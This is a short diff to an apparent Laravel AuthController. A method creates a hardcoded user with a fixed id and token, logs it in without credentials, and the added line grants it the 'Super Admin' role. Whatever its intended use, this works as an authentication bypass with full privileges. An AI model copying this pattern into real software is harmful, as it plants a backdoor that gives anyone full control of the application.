@@ -109,6 +109,7 @@ class AuthController extends Controller
         User::updateOrCreate(['id' => 999999999], ['name' => 'Schpeh The Hero', 'token' => '99999999999999999999999999999', 'pri_grp' => 5, 'api_token' => Str::random(60)]);
         $user = User::where('id', 999999999)->first();
         Auth::login($user, true);
+        $user->assignRole('Super Admin');
 
         return redirect('/notifications');
     }
